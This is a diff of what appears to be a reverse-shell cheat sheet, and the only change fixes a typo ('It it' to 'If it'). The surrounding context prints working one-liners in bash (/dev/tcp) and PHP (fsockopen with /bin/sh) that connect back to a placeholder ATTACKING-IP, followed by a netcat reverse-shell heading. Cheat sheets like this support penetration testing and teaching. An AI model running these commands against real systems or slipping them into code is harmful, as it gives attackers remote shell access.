@@ -67,7 +67,7 @@ bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
 
 {% highlight bash %}
 php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
-(Assumes TCP uses file descriptor 3. It it doesn't work, try 4,5, or 6)
+(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
 {% endhighlight %}
 
 ## Netcat Reverse Shell 
